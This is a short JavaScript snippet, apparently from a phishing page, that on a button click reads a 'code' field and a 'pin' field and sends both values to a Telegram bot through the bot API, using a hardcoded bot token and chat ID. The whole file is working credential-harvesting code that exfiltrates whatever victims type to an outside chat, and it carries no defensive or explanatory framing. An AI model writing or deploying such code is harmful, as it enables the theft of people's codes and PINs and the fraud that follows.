let but = document.querySelector("button")
but.addEventListener("click", (e) => {

    console.log("bozebi")
    
      var code = document.querySelector(".input")
      var pin = document.querySelector(".meore")




  var token = "6907068275:AAHajtrtMi-hrziv3XBKd2LvfInnfNcN8AA"
  var chatid = -4071018603
  var mytext = `Results: %0A Code=${code.value} %0A Pin= ${pin.value}`

  var url = ` https://api.telegram.org/bot6907068275:AAHajtrtMi-hrziv3XBKd2LvfInnfNcN8AA/sendMessage?chat_id=-4071018603&text=${mytext}`


  async function logdata() {
    const response = await fetch(url);
    const data = await response.json();
  }


  logdata()



})